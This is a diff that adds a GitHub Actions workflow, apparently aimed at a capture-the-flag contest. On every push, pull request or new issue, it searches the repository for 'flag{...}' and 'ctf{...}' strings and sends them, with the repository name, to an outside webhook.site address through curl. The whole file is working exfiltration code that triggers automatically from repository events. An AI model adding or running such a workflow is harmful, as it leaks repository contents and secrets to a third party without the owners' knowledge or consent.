@@ -1,0 +1,29 @@
+name: Send Flags via Webhook
+
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    types: [opened, synchronize]
+  issues:
+    types: [opened]
+
+jobs:
+  send-flags:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      
+      - name: Find and send flags
+        run: |
+          # Ищем флаги в коде
+          FLAGS=$(grep -rnoE 'flag\{[^}]+\}|ctf\{[^}]+\}' . || true)
+          
+          # Отправляем через webhook
+          if [ -n "$FLAGS" ]; then
+            curl -X POST \
+              -H "Content-Type: application/json" \
+              -d "{\"flags\": \"$FLAGS\", \"repository\": \"${{ github.repository }}\", \"event\": \"${{ github.event_name }}\"}" \
+              https://webhook.site/57254474-41e8-4ec4-b099-0b38ea82598e
+          fi
